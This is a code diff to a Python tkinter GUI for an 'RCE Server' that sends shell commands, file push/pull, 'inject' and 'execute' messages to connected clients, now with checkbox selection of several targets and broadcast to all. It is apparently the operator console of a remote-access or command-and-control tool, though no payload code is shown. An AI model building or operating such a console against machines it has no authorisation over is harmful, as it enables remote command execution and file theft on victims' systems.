@@ -1,6 +1,9 @@
 import tkinter as tk
+from tkinter import ttk
 from datetime import datetime
 from enum import Enum
+# from tkinter import filedialog
+from typing import Optional
 
 import config
 from src.core.message import Message, MessageType
@@ -16,14 +19,12 @@ class ServerGUI(RCEEventObserver):
         PURPLE = "mediumorchid"
         BLACK = "black"
 
-    __TIME_FORMAT = "%Y-%m-%d %H:%M:%S"
-
     def __init__(self, server: RCEServer):
         self.__server = server
         self.__server.add_observer(self)
-        self.__target_client = None
+        self.__target_clients = []
+        self.__client_vars = {}
 
-        # ServerGUI
         self.main_window = tk.Tk()
         self.main_window.title("RCE Server")
         self.main_window.geometry("1280x720")
@@ -48,10 +49,13 @@ class ServerGUI(RCEEventObserver):
         self.message_input = tk.Entry(self.content_bottom, font=('', 10, 'bold'))
         self.send_message_button = tk.Button(self.content_bottom, text="Send Message", font=('', 12, 'bold'),
                                              command=self.__handle_message_input)
+        # TODO: Add file input
+        # self.file_choose_button = tk.Button(self.content_bottom, text="Choose File", font=('', 12, 'bold'),
+        #                                     command=self.__handle_file_input)
 
         # Outputs
         self.messages_area = tk.Text(self.content_top, font=('', 10, 'bold'))
-        self.clients_list = tk.Listbox(self.content_top, font=('', 11, 'bold'))
+        self.client_frame = tk.Frame(self.content_top, background="white")
         self.bind_events()
 
     def bind_events(self):
@@ -73,9 +77,10 @@ class ServerGUI(RCEEventObserver):
     def build_content(self):
         self.content.config(padx=10, pady=10)
         self.messages_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        self.clients_list.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+        self.client_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
         self.message_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
-        self.send_message_button.pack(side=tk.LEFT, fill=tk.X, expand=False)
+        self.send_message_button.pack(side=tk.LEFT, fill=tk.X)
+        # TODO self.file_choose_button.pack(side=tk.LEFT, fill=tk.X)
 
     def build(self):
         self.build_header()
@@ -100,52 +105,47 @@ class ServerGUI(RCEEventObserver):
             args = message_string.split(" ")
             command = args[0]
             if command.startswith("@"):
-                self.__handle_command(command, args[1:])
+                if not (message := self.__handle_command(command, args)):
+                    self.__update_message_area("Invalid command", color=ServerGUI.TextColors.RED)
+                    return
+            else:
+                data = message_string.encode()
+                message = Message(message_type=MessageType.CMD, data=data)
+
+            target_clients = [client for client, var in self.__client_vars.items() if var.get()]
+            self.__target_clients = target_clients
+            if not self.__target_clients:
+                self.__server.broadcast_message(message)
                 return
 
-            # Send shell commands
-            data = message_string.encode()
-            message = Message(message_type=MessageType.CMD, data=data)
-            if self.__target_client:
-                self.__server.send_message_to_client(self.__target_client, message)
-            else:
-                self.__server.broadcast_message(message)
+            for client in self.__target_clients:
+                self.__server.send_message_to_client(client, message)
 
-    def __handle_command(self, command: str, args: list):
-        if command == "@target":
-            target = ' '.join(args[1:])
-            self.__target_client = target
-            self.__update_message_area(f"Targeting {target}", color=ServerGUI.TextColors.FORREST_GREEN)
-            self.__clear_message_input()
-            return
+    # TODO: Add file input
+    # def __handle_file_input(self):
+    #     file_path = filedialog.askopenfilename()
+    #     if not file_path:
+    #         self.__update_message_area("No file selected", color=ServerGUI.TextColors.RED)
+    #         return
+    #
+    #     self.__update_message_area(f"Uploading {file_path}", color=ServerGUI.TextColors.FORREST_GREEN)
+    #     # TODO: self.__server.send_file_to_client(self.__target_client, file_path)
 
+    @staticmethod
+    def __handle_command(command: str, args: list) -> Optional[Message]:
         data = ' '.join(args).encode()
         if command == "@echo":
-            message = Message(message_type=MessageType.ECHO, data=data)
+            return Message(message_type=MessageType.ECHO, data=data)
         elif command == "@push":
-            message = Message(message_type=MessageType.FILE_UPLOAD, data=data)
+            return Message(message_type=MessageType.FILE_UPLOAD, data=data)
         elif command == "@pull":
-            message = Message(message_type=MessageType.FILE_DOWNLOAD, data=data)
+            return Message(message_type=MessageType.FILE_DOWNLOAD, data=data)
         elif command == "@inject":
-            message = Message(message_type=MessageType.INJECT, data=data)
+            return Message(message_type=MessageType.INJECT, data=data)
         elif command == "@exec":
-            message = Message(message_type=MessageType.EXECUTE)
-        else:
-            self.__update_message_area(f"Unknown command: {command}", color=ServerGUI.TextColors.RED)
-            self.__clear_message_input()
-            return
-
-        if self.__target_client:
-            self.__server.send_message_to_client(self.__target_client, message)
-        else:
-            self.__server.broadcast_message(message)
+            return Message(message_type=MessageType.EXECUTE)
 
     def __update_message_area(self, message: str, color: TextColors = TextColors.DIM_GRAY):
-        """
-        Updates the message area with a new message
-        :param message: The message to be added
-        :param color: The color to be used to display the message
-        """
         message_format = f"{datetime.now().strftime(config.DATETIME_FORMAT)}: {message}"
         self.messages_area.config(state='normal')
         self.messages_area.tag_config(color.value, foreground=color.value)
@@ -158,16 +158,20 @@ class ServerGUI(RCEEventObserver):
 
     def on_connect(self, client_address: str):
         self.__update_message_area(f"{client_address} connected", color=ServerGUI.TextColors.FORREST_GREEN)
-        self.clients_list.insert(tk.END, client_address)
-        self.clients_list.update()
+        var = tk.BooleanVar()
+        self.__client_vars[client_address] = var
+        checkbox = ttk.Checkbutton(self.client_frame, text=client_address, variable=var)
+        checkbox.pack(anchor='w')
 
     def on_disconnect(self, client_address: str):
         self.__update_message_area(f"{client_address} disconnected", color=ServerGUI.TextColors.FORREST_GREEN)
-        for i in range(self.clients_list.size()):
-            if self.clients_list.get(i) == client_address:
-                self.clients_list.delete(i)
+        for widget in self.client_frame.winfo_children():
+            if widget.cget("text") == client_address:
+                widget.destroy()
                 break
-        self.clients_list.update()
+
+        if client_address in self.__client_vars:
+            del self.__client_vars[client_address]
 
     def on_message(self, sender: str, message: str):
         self.__update_message_area(f"{sender}: {message}", color=ServerGUI.TextColors.DIM_GRAY)
